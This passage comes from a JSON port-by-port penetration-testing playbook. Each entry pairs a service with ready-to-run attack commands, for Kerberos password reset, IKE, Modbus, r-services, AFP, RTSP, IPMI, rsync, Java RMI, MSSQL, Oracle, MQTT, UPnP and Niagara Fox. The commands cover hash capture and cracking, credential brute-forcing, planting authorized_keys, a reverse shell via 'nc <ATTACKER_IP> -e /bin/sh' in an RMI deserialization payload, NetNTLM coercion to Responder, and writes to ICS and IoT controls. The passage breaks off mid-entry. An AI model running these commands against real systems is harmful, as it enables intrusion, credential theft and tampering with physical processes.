  "note": "This is the Kerberos password-change service, and it is the lever that turns an ACL win into access: when BloodHound shows you ForceChangePassword or GenericAll over a user, 464 is where you reset their password, and it is also a quiet way to validate a credential without ever hitting SMB.",
  "categories": [
   "ad-attacks",
   "impacket-suite",
   "netexec",
   "password-ops"
  ],
  "attack": [
   "T1098"
  ],
  "keywords": [
   "changepasswd",
   "bloodyad",
   "net rpc password",
   "smbpasswd",
   "setuserinfo2",
   "kpasswd"
  ],
  "yields": [
   "creds",
   "domain-user"
  ],
  "needs": [
   "creds"
  ],
  "steps": [
   {
    "phase": "foothold",
    "label": "Change your own expired/known password over Kerberos",
    "cmd": "impacket-changepasswd '<DOMAIN>/<USER>:<PASS>'@<DC_IP> -newpass 'NewPass123!'",
    "when": "if password expired or must-change-at-logon",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "lateral",
    "label": "Force-reset a target user you have ACL rights over",
    "cmd": "bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASS>' set password targetuser 'NewPass123!'",
    "when": "if ForceChangePassword/GenericAll on target",
    "yields": [
     "domain-user"
    ]
   },
   {
    "phase": "lateral",
    "label": "Reset a target password via impacket (no auth to target)",
    "cmd": "impacket-changepasswd '<DOMAIN>/targetuser'@<DC_IP> -newpass 'NewPass123!' -altuser '<USER>' -altpass '<PASS>' -reset",
    "when": "if ForceChangePassword on target",
    "yields": [
     "domain-user"
    ]
   }
  ]
 },
 {
  "ports": [
   500,
   4500
  ],
  "service": "ike",
  "aliases": [
   "isakmp",
   "ipsec-nat-t"
  ],
  "proto": "udp",
  "risk": "medium",
  "note": "The classic flaw is IKE Aggressive Mode: the gateway returns the PSK hash before authenticating, so `ike-scan -A` captures it and `psk-crack` brute-forces it offline — a cracked PSK plus a known group name is a VPN foothold into the internal network.",
  "categories": [
   "recon",
   "service-exploitation",
   "password-ops",
   "pivoting"
  ],
  "attack": [
   "T1046",
   "T1110.002",
   "T1557",
   "T1133"
  ],
  "keywords": [
   "ike-scan",
   "psk-crack",
   "ike-version",
   "nmap ike",
   "isakmp"
  ],
  "yields": [
   "hashes",
   "creds"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Fingerprint the VPN gateway and vendor",
    "cmd": "ike-scan -M <TARGET_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Confirm IKE version via NSE",
    "cmd": "nmap -sU -p500 --script ike-version <TARGET_IP> -oN nmap_ike.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Attempt Aggressive Mode and save the PSK hash",
    "cmd": "ike-scan -M -A --id=vpn --pskcrack=psk.txt <TARGET_IP>",
    "when": "if aggressive mode enabled",
    "yields": [
     "hashes"
    ]
   },
   {
    "phase": "foothold",
    "label": "Crack the captured PSK offline",
    "cmd": "psk-crack -d /usr/share/wordlists/rockyou.txt psk.txt",
    "when": "if psk hash captured",
    "yields": [
     "creds"
    ]
   }
  ]
 },
 {
  "ports": [
   502
  ],
  "service": "modbus",
  "aliases": [
   "mbap",
   "modbus"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "Modbus/TCP has no authentication at all, so the win is simply reading and writing coils/registers once you learn the live unit IDs — on a CTF it is usually a flag stored in a holding register, in the field it is control of a physical process, so read before you ever write.",
  "categories": [
   "recon",
   "service-exploitation",
   "metasploit",
   "vuln-assessment"
  ],
  "attack": [
   "T1046",
   "T0846",
   "T0861",
   "T0855",
   "T0836"
  ],
  "keywords": [
   "modbus-discover",
   "modbusclient",
   "modbus_findunitid",
   "mbtget",
   "pymodbus",
   "nmap modbus"
  ],
  "yields": [
   "file-read",
   "foothold"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Discover device and enumerate function codes/SID",
    "cmd": "nmap -p502 --script modbus-discover --script-args='modbus-discover.aggressive=true' <TARGET_IP> -oN nmap_modbus.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Find responding unit/slave IDs",
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/scada/modbus_findunitid; set RHOSTS <TARGET_IP>; run; exit'",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Read holding registers (look for flags/setpoints)",
    "cmd": "mbtget -r3 -a 0 -n 20 -u 1 <TARGET_IP>",
    "when": "always",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "enum",
    "label": "Scripted register/coil read-write client",
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/scada/modbusclient; set RHOSTS <TARGET_IP>; set UNIT_NUMBER 1; set ACTION READ_HOLDING_REGISTERS; run; exit'",
    "when": "if unit id known",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "loot",
    "label": "Read with pymodbus console",
    "cmd": "pymodbus.console tcp --host <TARGET_IP> --port 502",
    "when": "always",
    "yields": []
   }
  ]
 },
 {
  "ports": [
   512,
   513,
   514
  ],
  "service": "r-services",
  "aliases": [
   "exec",
   "login",
   "shell",
   "rsh",
   "rlogin",
   "rexec"
  ],
  "proto": "tcp",
  "risk": "medium",
  "note": "The win on the r-services is trust abuse - a permissive .rhosts or hosts.equiv lets rlogin/rsh in with no password (often as root), and any credentials asked for travel in cleartext.",
  "categories": [
   "initial-foothold",
   "service-exploitation",
   "post-exploitation-linux",
   "password-ops"
  ],
  "attack": [
   "T1021",
   "T1199",
   "T1078",
   "T1110.001"
  ],
  "keywords": [
   "rlogin",
   "rsh",
   "rexec",
   "rusers",
   "rwho",
   "hydra rexec"
  ],
  "yields": [
   "foothold",
   "shell",
   "users"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Identify exec/login/shell on 512-514",
    "cmd": "nmap -sV -p512,513,514 <TARGET_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "List logged-in users to seed trust guesses",
    "cmd": "rusers -l <TARGET_IP>",
    "when": "always",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "foothold",
    "label": "Abuse a trust relationship as root",
    "cmd": "rlogin -l root <TARGET_IP>",
    "when": "if a permissive .rhosts / hosts.equiv is suspected",
    "yields": [
     "shell",
     "foothold"
    ]
   },
   {
    "phase": "foothold",
    "label": "rlogin as a known local user",
    "cmd": "rlogin <TARGET_IP> -l <USER>",
    "when": "if a username is known and trust exists",
    "yields": [
     "shell",
     "foothold"
    ]
   },
   {
    "phase": "foothold",
    "label": "Command execution over rsh",
    "cmd": "rsh -l <USER> <TARGET_IP> id",
    "when": "if trust present",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Brute force rexec credentials",
    "cmd": "hydra -L users.txt -P passwords.txt rexec://<TARGET_IP>",
    "when": "if no trust and creds must be guessed",
    "yields": [
     "creds"
    ]
   }
  ]
 },
 {
  "ports": [
   512,
   513,
   514
  ],
  "service": "rservices",
  "aliases": [
   "exec",
   "login",
   "shell"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "The r-services trust the client blindly: a `.rhosts`/`hosts.equiv` with `+ +` (or a matching hostname) lets you rlogin/rsh in with no password at all — always test for root trust before you bother brute-forcing, it is the classic instant foothold on old Unix boxes.",
  "categories": [
   "recon",
   "initial-foothold",
   "lateral-move"
  ],
  "attack": [
   "T1046",
   "T1021",
   "T1078"
  ],
  "keywords": [
   "rlogin",
   "rsh",
   "rexec",
   "rsh-brute",
   "rlogin-brute",
   "rexec-brute"
  ],
  "yields": [
   "shell",
   "foothold",
   "creds"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Probe and brute the r-services",
    "cmd": "nmap -p512,513,514 -sV --script rsh-brute,rlogin-brute,rexec-brute <TARGET_IP> -oN nmap_rservices.txt",
    "when": "always",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "foothold",
    "label": "Passwordless root login via .rhosts trust",
    "cmd": "rlogin -l root <TARGET_IP>",
    "when": "if host trusts clients (.rhosts / hosts.equiv)",
    "yields": [
     "shell"
    ]
   },
   {
    "phase": "foothold",
    "label": "Remote command exec with known creds/trust",
    "cmd": "rsh -l <USER> <TARGET_IP> id",
    "when": "if creds or trust known",
    "yields": [
     "shell"
    ]
   }
  ]
 },
 {
  "ports": [
   548
  ],
  "service": "afp",
  "aliases": [
   "afp",
   "afpovertcp",
   "appleshare"
  ],
  "proto": "tcp",
  "risk": "medium",
  "note": "AFP is the Apple SMB equivalent and leaks a lot pre-auth: afp-serverinfo hands you the machine name, server signature and sometimes valid usernames, and guest-enabled volumes mount with no creds, so enumerate shares and test guest before you ever brute-force.",
  "categories": [
   "recon",
   "file-ops",
   "password-ops",
   "service-exploitation"
  ],
  "attack": [
   "T1046",
   "T1135",
   "T1110.001",
   "T1021"
  ],
  "keywords": [
   "afp",
   "afp-serverinfo",
   "afp-showmount",
   "afp-ls",
   "mount_afp",
   "hydra afp"
  ],
  "yields": [
   "file-read",
   "creds",
   "users"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Server info, shares and listing via NSE",
    "cmd": "nmap -p548 -sV --script afp-serverinfo,afp-showmount,afp-ls <TARGET_IP> -oN nmap_afp.txt",
    "when": "always",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "enum",
    "label": "List exported volumes explicitly",
    "cmd": "nmap -p548 --script afp-showmount <TARGET_IP>",
    "when": "if afp confirmed",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Guest mount of a volume (afpfs-ng)",
    "cmd": "sudo mkdir -p /mnt/afp && mount_afp \"afp://<TARGET_IP>/SHARE\" /mnt/afp",
    "when": "if guest access is enabled",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "foothold",
    "label": "Authenticated mount with recovered creds",
    "cmd": "mount_afp \"afp://<USER>:<PASS>@<TARGET_IP>/SHARE\" /mnt/afp",
    "when": "if creds known",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "foothold",
    "label": "Credential spray against AFP",
    "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt afp://<TARGET_IP> -t 4 -f",
    "when": "if username known and no lockout policy",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "loot",
    "label": "Hunt keychains, keys and plists on the mount",
    "cmd": "find /mnt/afp \\( -iname '*.keychain' -o -iname 'id_rsa' -o -iname '*.plist' \\) 2>/dev/null",
    "when": "after any successful mount",
    "yields": [
     "creds"
    ]
   }
  ]
 },
 {
  "ports": [
   554,
   8554
  ],
  "service": "rtsp",
  "aliases": [
   "rtsp",
   "rtsp-alt"
  ],
  "proto": "tcp",
  "risk": "medium",
  "note": "RTSP is almost always an IP camera/NVR; the win is finding the stream path and auth — `DESCRIBE` without auth or a default-credential path gives you a live video feed, and Cameradar automates the path-brute plus known default logins across camera vendors.",
  "categories": [
   "recon",
   "service-exploitation",
   "password-ops"
  ],
  "attack": [
   "T1046",
   "T1110",
   "T1125",
   "T1133"
  ],
  "keywords": [
   "cameradar",
   "rtsp-methods",
   "rtsp-url-brute",
   "ffmpeg rtsp",
   "nmap rtsp"
  ],
  "yields": [
   "creds",
   "foothold"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Enumerate RTSP methods and brute common stream URLs",
    "cmd": "nmap -p554 --script rtsp-methods,rtsp-url-brute <TARGET_IP> -oN nmap_rtsp.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Automated path + default-credential discovery",
    "cmd": "cameradar -t <TARGET_IP>",
    "when": "always",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "enum",
    "label": "Manual DESCRIBE to check for an open stream",
    "cmd": "curl -s -X DESCRIBE 'rtsp://<TARGET_IP>:554/' -H 'CSeq: 1'",
    "when": "always",
    "yields": []
   },
   {
    "phase": "loot",
    "label": "Grab a snapshot/clip from the discovered stream",
    "cmd": "ffmpeg -i 'rtsp://<USER>:<PASS>@<TARGET_IP>:554/Streaming/Channels/101' -frames:v 1 snapshot.jpg",
    "when": "if stream path and creds known",
    "yields": [
     "foothold"
    ]
   }
  ]
 },
 {
  "ports": [
   593
  ],
  "service": "rpc-over-http",
  "aliases": [
   "http-rpc-epmap",
   "ncacn_http"
  ],
  "proto": "tcp",
  "risk": "medium",
  "note": "593 is the endpoint mapper spoken over HTTP and is routinely left open when 135 is filtered at the firewall, so when a straight rpcdump times out, re-run it against 593 and you often recover the full interface list and a reachable path to coercion and ADCS RPC endpoints.",
  "categories": [
   "impacket-suite",
   "ad-recon",
   "service-exploitation",
   "recon"
  ],
  "attack": [
   "T1046",
   "T1018"
  ],
  "keywords": [
   "impacket-rpcdump",
   "-port 593",
   "ncacn_http",
   "rpc-grind"
  ],
  "yields": [
   "users"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Dump RPC endpoints over HTTP transport",
    "cmd": "impacket-rpcdump -port 593 <TARGET_IP> | tee rpcdump_593.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Grep for the interfaces that matter",
    "cmd": "grep -iE 'spoolss|efsr|cert|drsuapi|MS-RPRN|MS-EFSR' rpcdump_593.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Confirm the service and version",
    "cmd": "nmap -p593 -sV --script rpc-grind <TARGET_IP> -oN nmap_593.txt",
    "when": "if 135 filtered",
    "yields": []
   }
  ]
 },
 {
  "ports": [
   623,
   664
  ],
  "service": "ipmi",
  "aliases": [
   "asf-rmcp",
   "ipmi",
   "rmcp"
  ],
  "proto": "udp",
  "risk": "high",
  "note": "IPMI 2.0's RAKP handshake leaks a crackable password hash to any unauthenticated client, and cipher-zero boxes let you skip cracking entirely and just add a BMC admin — either way the BMC usually rides the host management network with vendor-default creds.",
  "categories": [
   "recon",
   "password-ops",
   "service-exploitation",
   "metasploit"
  ],
  "attack": [
   "T1046",
   "T1110.002",
   "T1212",
   "T1110",
   "T1003",
   "T1078.001"
  ],
  "keywords": [
   "ipmitool",
   "ipmi_dumphashes",
   "ipmi_cipher_zero",
   "ipmi_version",
   "hashcat -m 7300",
   "ipmi-version",
   "ipmi-cipher-zero",
   "nmap ipmi"
  ],
  "yields": [
   "hashes",
   "creds",
   "admin"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Version + cipher-zero check",
    "cmd": "nmap -sU -p623 --script ipmi-version,ipmi-cipher-zero <TARGET_IP> -oN nmap_ipmi.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "recon",
    "label": "MSF version fingerprint",
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS <TARGET_IP>; run; exit'",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Dump RAKP password hashes",
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <TARGET_IP>; set OUTPUT_HASHCAT_FILE ipmi.hashes; run; exit'",
    "when": "always",
    "yields": [
     "hashes"
    ]
   },
   {
    "phase": "foothold",
    "label": "Crack the RAKP hash offline",
    "cmd": "hashcat -m 7300 ipmi.hashes /usr/share/wordlists/rockyou.txt",
    "when": "if hashes captured",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "foothold",
    "label": "Cipher-zero auth bypass — list/alter BMC users",
    "cmd": "ipmitool -I lanplus -C 0 -H <TARGET_IP> -U Administrator -P '' user list",
    "when": "if cipher-zero vulnerable",
    "yields": [
     "admin"
    ]
   },
   {
    "phase": "loot",
    "label": "Reset a BMC account password with recovered creds",
    "cmd": "ipmitool -I lanplus -H <TARGET_IP> -U <USER> -P '<PASS>' user set password 2 'Newp@ss123'",
    "when": "if creds known",
    "yields": [
     "admin"
    ]
   }
  ]
 },
 {
  "ports": [
   873
  ],
  "service": "rsync",
  "aliases": [
   "rsync"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "Module listing is anonymous by default, so the trailing :: (or rsync://host/) is the whole enumeration; the kill shot is a writable module rooted at a home dir or webroot where you drop an authorized_keys or webshell, and note -a preserves the sender's UID so files can land owned by root.",
  "categories": [
   "recon",
   "file-ops",
   "initial-foothold",
   "linux-escalation"
  ],
  "attack": [
   "T1105",
   "T1083",
   "T1548.001",
   "T1021"
  ],
  "keywords": [
   "rsync",
   "rsync-list-modules",
   "rsync://",
   "rsync_password",
   "--list-only"
  ],
  "yields": [
   "file-read",
   "source-code",
   "creds",
   "foothold"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "NSE module enumeration",
    "cmd": "nmap -p873 -sCV --script rsync-list-modules <TARGET_IP> -oN nmap_rsync.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "recon",
    "label": "List modules anonymously",
    "cmd": "rsync -av --list-only rsync://<TARGET_IP>:873/",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "List a module's contents",
    "cmd": "rsync -av --list-only rsync://<TARGET_IP>:873/SHARE/",
    "when": "if modules listed",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "foothold",
    "label": "Pull a readable module in full",
    "cmd": "rsync -av rsync://<TARGET_IP>:873/SHARE/ ./rsync_loot/",
    "when": "if a module is readable",
    "yields": [
     "source-code",
     "file-read"
    ]
   },
   {
    "phase": "lateral",
    "label": "Drop authorized_keys into a writable home module",
    "cmd": "rsync -av ./authorized_keys rsync://<TARGET_IP>:873/SHARE/root/.ssh/authorized_keys",
    "when": "if a module is writable and maps to a home directory",
    "yields": [
     "foothold"
    ]
   },
   {
    "phase": "enum",
    "label": "Authenticated access to a protected module",
    "cmd": "RSYNC_PASSWORD='<PASS>' rsync -av --list-only rsync://<USER>@<TARGET_IP>:873/SHARE/",
    "when": "if module requires auth and creds known",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "loot",
    "label": "Grep the pulled files for secrets and keys",
    "cmd": "grep -rniE 'passw|BEGIN OPENSSH PRIVATE KEY|api[_-]?key|secret' ./rsync_loot",
    "when": "if files were downloaded",
    "yields": [
     "creds"
    ]
   }
  ]
 },
 {
  "ports": [
   1099,
   1098,
   1050,
   9999,
   8686,
   11099
  ],
  "service": "java-rmi",
  "aliases": [
   "java-rmi",
   "rmiregistry",
   "jmx",
   "mx4j"
  ],
  "proto": "tcp",
  "risk": "critical",
  "note": "The bound names in the registry tell you what the app is, and remote-method-guesser checks the JEP290 deserialization filter and probes bound objects that nmap's rmi scripts miss; if it turns out to be JMX (often 9999/8686) without auth it is direct RCE via the MLet classloader.",
  "categories": [
   "service-exploitation",
   "exploit-dev",
   "metasploit",
   "vuln-assessment"
  ],
  "attack": [
   "T1210",
   "T1190",
   "T1059",
   "T1046"
  ],
  "keywords": [
   "rmg",
   "remote-method-guesser",
   "beanshooter",
   "rmi-dumpregistry",
   "ysoserial",
   "rmi-vuln-classloader"
  ],
  "yields": [
   "shell",
   "foothold",
   "file-read"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Registry enumeration + vuln checks",
    "cmd": "rmg enum <TARGET_IP> <PORT>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "recon",
    "label": "NSE registry dump",
    "cmd": "nmap -p<PORT> -sCV --script rmi-dumpregistry,rmi-vuln-classloader <TARGET_IP> -oN nmap_rmi.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Guess remote methods on bound objects",
    "cmd": "rmg guess <TARGET_IP> <PORT>",
    "when": "if bound names found",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "JMX enumeration",
    "cmd": "beanshooter enum <TARGET_IP> <PORT>",
    "when": "if service is JMX",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Deserialization RCE via gadget",
    "cmd": "rmg serial <TARGET_IP> <PORT> CommonsCollections6 'nc <ATTACKER_IP> <LPORT> -e /bin/sh' --bound-name BOUND_NAME",
    "when": "if JEP290 missing or gadget available",
    "yields": [
     "shell",
     "foothold"
    ]
   },
   {
    "phase": "foothold",
    "label": "Unauthenticated JMX MLet RCE",
    "cmd": "msfconsole -q -x 'use exploit/multi/misc/java_jmx_server; set RHOSTS <TARGET_IP>; set RPORT <PORT>; set LHOST <ATTACKER_IP>; set LPORT <LPORT>; run; exit'",
    "when": "if JMX unauthenticated",
    "yields": [
     "shell",
     "foothold"
    ]
   }
  ]
 },
 {
  "ports": [
   1433,
   1434
  ],
  "service": "mssql",
  "aliases": [
   "ms-sql-s",
   "ms-sql-m",
   "mssql",
   "microsoft-sql-server",
   "ms-sql"
  ],
  "proto": "both",
  "risk": "critical",
  "note": "On a domain this is a top target: service accounts are sprayable/kerberoastable, xp_cmdshell gives SYSTEM-context RCE, and xp_dirtree coerces the service account's NetNTLM hash to your Responder.",
  "categories": [
   "service-exploitation",
   "impacket-suite",
   "netexec",
   "ad-attacks",
   "lateral-move"
  ],
  "attack": [
   "T1046",
   "T1110.003",
   "T1078.002",
   "T1210",
   "T1187",
   "T1021"
  ],
  "keywords": [
   "ms-sql-info",
   "ms-sql-ntlm-info",
   "impacket-mssqlclient",
   "nxc mssql",
   "xp_cmdshell",
   "xp_dirtree",
   "enable_xp_cmdshell",
   "mssql_login"
  ],
  "yields": [
   "shell",
   "hashes",
   "creds",
   "domain-user"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Instance info and NTLM leak",
    "cmd": "nmap -sV -p1433 --script=ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password <TARGET_IP>",
    "when": "always",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "enum",
    "label": "Validate creds / spray over MSSQL",
    "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN>",
    "when": "if creds known",
    "yields": [
     "foothold"
    ]
   },
   {
    "phase": "foothold",
    "label": "Interactive SQL shell (Windows auth)",
    "cmd": "impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<TARGET_IP> -windows-auth",
    "when": "if creds known",
    "yields": [
     "foothold"
    ]
   },
   {
    "phase": "foothold",
    "label": "One-shot command exec via xp_cmdshell",
    "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN> -x \"whoami\"",
    "when": "if user is sysadmin or can enable xp_cmdshell",
    "yields": [
     "shell"
    ]
   },
   {
    "phase": "lateral",
    "label": "Coerce service-account NetNTLM to Responder",
    "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN> -q \"EXEC xp_dirtree '\\\\\\\\<ATTACKER_IP>\\\\share',1,1\"",
    "when": "if Responder running on <ATTACKER_IP>",
    "yields": [
     "hashes"
    ]
   },
   {
    "phase": "privesc",
    "label": "Enumerate linked servers / impersonation",
    "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN> -q \"EXEC sp_linkedservers;\"",
    "when": "if initial principal is low-priv",
    "yields": [
     "admin"
    ]
   },
   {
    "phase": "loot",
    "label": "Enumerate databases and secrets",
    "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN> -q \"SELECT name FROM sys.databases;\"",
    "when": "if creds known",
    "yields": [
     "creds"
    ]
   }
  ]
 },
 {
  "ports": [
   1521,
   1526
  ],
  "service": "oracle-tns",
  "aliases": [
   "oracle-tns",
   "oracle",
   "oracle-tns-listener"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "You must first guess the SID, then weak default accounts (scott/tiger, system/manager) open the door, and odat turns a login into file read/write and RCE via utlfile/externaltable/dbmsscheduler.",
  "categories": [
   "service-exploitation",
   "password-ops",
   "recon",
   "file-ops"
  ],
  "attack": [
   "T1046",
   "T1110.001",
   "T1078",
   "T1210"
  ],
  "keywords": [
   "oracle-sid-brute",
   "oracle-brute",
   "odat",
   "tnscmd10g",
   "oscanner",
   "sidguesser",
   "passwordguesser",
   "utlfile",
   "externaltable"
  ],
  "yields": [
   "creds",
   "shell",
   "file-read"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Probe the TNS listener version and SIDs",
    "cmd": "nmap -sV -p1521 --script=oracle-tns-version,oracle-sid-brute <TARGET_IP>",
    "when": "always",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "enum",
    "label": "Brute-force the SID",
    "cmd": "odat sidguesser -s <TARGET_IP> -p 1521",
    "when": "if SID unknown",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Guess default/weak account passwords",
    "cmd": "odat passwordguesser -s <TARGET_IP> -p 1521 -d SID",
    "when": "if SID known",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "foothold",
    "label": "Connect with sqlplus",
    "cmd": "sqlplus <USER>/<PASS>@<TARGET_IP>:1521/SID",
    "when": "if creds and SID known",
    "yields": [
     "foothold"
    ]
   },
   {
    "phase": "loot",
    "label": "Read a server file via odat",
    "cmd": "odat utlfile -s <TARGET_IP> -p 1521 -U <USER> -P <PASS> -d SID --getFile /etc passwd /tmp/passwd.loot",
    "when": "if creds known",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "foothold",
    "label": "Command execution via odat",
    "cmd": "odat externaltable -s <TARGET_IP> -p 1521 -U <USER> -P <PASS> -d SID --exec /tmp id",
    "when": "if account has sufficient privileges",
    "yields": [
     "shell"
    ]
   }
  ]
 },
 {
  "ports": [
   1883,
   8883
  ],
  "service": "mqtt",
  "aliases": [
   "mqtt",
   "secure-mqtt"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "The decisive move is a wildcard subscribe to `#` — most brokers allow anonymous connect and happily stream every topic, which on IoT/CTF boxes leaks device telemetry, credentials, command topics and flags in plaintext; publishing to a command topic can then actuate devices.",
  "categories": [
   "recon",
   "service-exploitation",
   "file-ops"
  ],
  "attack": [
   "T1046",
   "T1040",
   "T1213",
   "T1110"
  ],
  "keywords": [
   "mosquitto_sub",
   "mosquitto_pub",
   "mqtt-subscribe",
   "mqtt-pwn",
   "nmap mqtt"
  ],
  "yields": [
   "creds",
   "file-read",
   "foothold"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Probe broker and dump retained topics",
    "cmd": "nmap -p1883 --script mqtt-subscribe <TARGET_IP> -oN nmap_mqtt.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Anonymous wildcard subscribe to everything",
    "cmd": "mosquitto_sub -h <TARGET_IP> -p 1883 -t '#' -v",
    "when": "if anonymous allowed",
    "yields": [
     "creds",
     "file-read"
    ]
   },
   {
    "phase": "enum",
    "label": "Authenticated wildcard subscribe",
    "cmd": "mosquitto_sub -h <TARGET_IP> -p 1883 -u '<USER>' -P '<PASS>' -t '#' -v",
    "when": "if creds known",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "foothold",
    "label": "Publish to a command/control topic",
    "cmd": "mosquitto_pub -h <TARGET_IP> -p 1883 -t 'cmd/device' -m 'payload'",
    "when": "if writable topic found",
    "yields": [
     "foothold"
    ]
   }
  ]
 },
 {
  "ports": [
   1900
  ],
  "service": "ssdp",
  "aliases": [
   "upnp",
   "ssdp"
  ],
  "proto": "udp",
  "risk": "medium",
  "note": "SSDP points you at the UPnP device descriptor (the `LOCATION` URL), and the SOAP control endpoint it names is where the abuse lives — `AddPortMapping` on an exposed IGD opens the firewall for pivoting, and the descriptor leaks model/firmware for CVE matching.",
  "categories": [
   "recon",
   "service-exploitation",
   "metasploit",
   "pivoting"
  ],
  "attack": [
   "T1046",
   "T1190",
   "T1557",
   "T1090"
  ],
  "keywords": [
   "upnp-info",
   "ssdp_msearch",
   "upnpc",
   "evil-ssdp",
   "nmap upnp",
   "miniupnpc"
  ],
  "yields": [
   "file-read"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Discover UPnP devices and read the descriptor",
    "cmd": "nmap -sU -p1900 --script upnp-info <TARGET_IP> -oN nmap_ssdp.txt",
    "when": "always",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "recon",
    "label": "M-SEARCH sweep via Metasploit",
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/upnp/ssdp_msearch; set RHOSTS <TARGET_IP>; run; exit'",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "List the IGD and its port mappings",
    "cmd": "upnpc -u 'http://<TARGET_IP>:1900/rootDesc.xml' -l",
    "when": "if descriptor url known",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "lateral",
    "label": "Add a port mapping through the IGD for pivoting",
    "cmd": "upnpc -u 'http://<TARGET_IP>:1900/rootDesc.xml' -a <ATTACKER_IP> <LPORT> <LPORT> TCP",
    "when": "if igd writable",
    "yields": [
     "foothold"
    ]
   }
  ]
 },
 {
  "ports": [
   1911,
   4911
  ],
  "service": "niagara-fox",
  "aliases": [
   "niagara-fox",
   "fox"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "The Tridium Niagara Fox protocol fronts building-management systems; fox-info is unauthenticated and leaks the station name, host IDs, platform version and even the OS/Java build — a direct map to the Niagara CVEs and to the station's web admin on 80/443.",
  "categories": [
   "recon",
   "service-exploitation",
   "vuln-assessment"
  ],
  "attack": [
   "T1046",
   "T0846",
   "T0888",
   "T1190"
  ],
  "keywords": [
   "fox-info",
   "niagara",
   "tridium",
   "nmap fox"
  ],
  "yields": [
   "file-read",
   "users"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Read station identity via the Fox protocol",
    "cmd": "nmap -p1911,4911 --script fox-info <TARGET_IP> -oN nmap_fox.txt",
    "when": "always",
    "yields": [
     "file-read",
     "users"
    ]
   },
   {
    "phase": "enum",
    "label": "Map the disclosed version to Niagara advisories",
    "cmd": "searchsploit niagara tridium",
    "when": "if version identified",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Attack the station web admin found on 80/443",
    "cmd": "curl -sk https://<TARGET_IP>/login/ -i",
